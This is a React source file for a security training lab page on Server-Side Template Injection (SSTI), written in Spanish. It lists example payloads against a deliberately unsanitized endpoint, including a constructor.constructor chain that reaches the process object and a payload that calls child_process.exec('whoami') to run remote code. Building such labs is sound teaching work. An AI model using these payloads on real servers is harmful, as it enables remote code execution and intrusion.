import LabTemplate from "@/components/LabTemplate";

export default function SSTILab() {
  return (
    <LabTemplate
      title="Server-Side Template Injection (SSTI)"
      description="Ejecución de código a través de plantillas del servidor mediante inyección de expresiones"
      severity="critical"
      color="from-purple-500 to-pink-600"
      apiEndpoint="/api/lab/ssti?template={{7*7}}"
      examples={[
        {
          name: "Expresión matemática básica",
          description: "Prueba si el motor de plantillas evalúa expresiones",
          url: "/api/lab/ssti?template={{7*7}}"
        },
        {
          name: "Acceso a objetos globales",
          description: "Intento de acceder a objetos del sistema",
          url: "/api/lab/ssti?template={{constructor.constructor('return process')()}}"
        },
        {
          name: "Ejecución de código",
          description: "Payload avanzado para RCE",
          url: "/api/lab/ssti?template={{this.process.mainModule.require('child_process').exec('whoami')}}"
        }
      ]}
      vulnerabilityInfo="Este endpoint renderiza plantillas con entrada del usuario sin sanitización. Un atacante puede inyectar expresiones de template para ejecutar código arbitrario en el servidor, acceder a objetos del sistema, o leer archivos sensibles."
    />
  );
}
